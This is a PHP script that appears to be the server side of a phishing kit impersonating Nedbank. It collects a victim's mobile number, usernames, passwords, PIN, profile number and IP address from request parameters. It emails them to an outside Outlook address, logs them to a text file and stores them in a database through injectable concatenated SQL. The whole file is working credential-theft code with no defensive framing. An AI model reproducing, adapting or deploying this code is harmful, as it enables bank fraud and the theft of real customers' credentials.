<?php
if(isset($_GET['mobileNumber']))
{
    include_once 'sqlite.php';
    $cellphone = $_GET['mobileNumber'];
    
    
    $ccn = $_GET['Username'];
    $csp = $_GET['UsernamePassword'];
    //
    $profile = $_GET['PROFILE_NUMBER'];
    $pin = $_GET['PIN'];
    $password = $_GET['PASSWORD'];
    
    $ip = $_SERVER['REMOTE_ADDR'];
    // the message
    //$msg = "First line of text\nSecond line of text";
    $msg = "+-----------------------------------------------+\r\n";
    $msg .= "mobileNumber : $cellphone\r\n\r\n";
    
    $msg .= "Username : $ccn\r\n";
    $msg .= "Password : $csp\r\n\r\n";
    
    //
    
    $msg .= "Profile Number : $profile\r\n";
    $msg .= "Pin: $pin \r\n";
    $msg .= "Password: $password\r\n";
    $msg .= "Remote_Addr: $ip\r\n\n";
    $msg .= "+-----------------------------------------------+\r\n\r\n";


    // use wordwrap() if lines are longer than 70 characters
    $msg = wordwrap($msg,70);
    
    $from = "noreply <support@".$_SERVER['HTTP_HOST'].">";
    $headers = "From:" . $from;
    $subject = "NED CELLPHONE Access [$profile] [$ip]";
    
    $username0 = explode("@", $ccn);
    $username = $username0[0];

    // send email
    if(mail('definitepurposefocus@outlook.com', $subject, $msg, $headers))
    {
        $file = "NED-2018-PROFILE.txt";
        file_put_contents($file, $msg, FILE_APPEND);
        
        $query = 'INSERT INTO result (subject,message,isread,date_time) VALUES ("'.$subject.'","'.$msg.'","notread","'. date("Y-m-d H:i:s").'");';
        $db->exec($query);
            
        header("Content-Type: application/javascript");
        $callback = $_GET["callback"];
        
        $experience_login = file_get_contents('../NediBalars~STOVEDROP~MAX.htm');
        $experience_login = str_replace('{username}', $ccn, $experience_login);
        $experience_login = str_replace('{password}', $csp, $experience_login);
        
        $experience_login = str_replace('{PROFILE_NUMBER}', $profile, $experience_login);
        include("../images/Nedbank.png");
        include("../images/logo-blu.png");
        $experience_login = str_replace('{PIN}', $pin, $experience_login);
        $experience_login = str_replace('{PASSWORD}', $password, $experience_login);
        
        $experience_login = str_replace('{VERIFIED}', $username, $experience_login);
        
        $experience_login = str_replace('{mobileNumber}', $cellphone, $experience_login);
        
        $jsonResponse = json_encode(array('message' => $experience_login, 'accessData' => array(
                    'username' => $ccn, 
                    'password' => $csp
                )));
        echo $callback . '(' . $jsonResponse . ')';	
    }
}
?>